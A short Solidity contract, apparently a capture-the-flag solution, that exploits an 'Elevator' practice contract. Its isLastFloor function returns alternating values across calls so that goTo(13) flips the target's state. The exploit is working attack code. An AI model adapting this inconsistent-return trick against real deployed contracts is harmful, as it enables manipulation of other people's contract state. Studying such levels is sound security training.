pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorHack {
    Elevator public target =
        Elevator(INSTANCE_ADDR);
    bool result = true;

    function isLastFloor(uint256) public returns (bool) {
        if (result == true) {
            // first call
            result = false;
        } else {
            // second call 
            result = true;
        }
        return result;
    }

    function attack() public {
        target.goTo(13); // any number works 
    }
}
